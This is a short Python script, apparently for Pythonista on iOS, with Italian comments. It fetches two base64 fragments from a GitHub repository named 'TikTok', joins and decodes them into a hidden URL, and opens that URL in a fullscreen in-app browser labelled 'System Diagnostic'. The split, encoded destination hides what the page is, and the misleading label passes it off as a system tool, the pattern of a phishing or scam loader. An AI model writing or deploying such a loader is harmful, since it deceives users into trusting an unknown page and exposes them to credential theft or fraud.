import requests, base64, ui

def brain():
    # URL puntati esattamente ai nomi che vedo nel tuo screenshot
    BASE = "https://raw.githubusercontent.com/christianniederhauser906-ship-it/TikTok/principale/"
    
    try:
        # Recupero i file con i nomi corretti: parte1.py e part2_1.py
        p1 = requests.get(BASE + "parte1.py").text.strip()
        p2 = requests.get(BASE + "part2_1.py").text.strip()
        
        # Unione e decodifica sicura
        full_encoded = p1 + p2
        url = base64.b64decode(full_encoded).decode('utf-8', errors='ignore')
        
        # Apertura browser interno
        v = ui.WebView()
        v.name = "System Diagnostic"
        v.load_url(url)
        v.present('fullscreen')
        
    except Exception as e:
        print(f"Errore: {e}")

if __name__ == "__main__":
    brain()
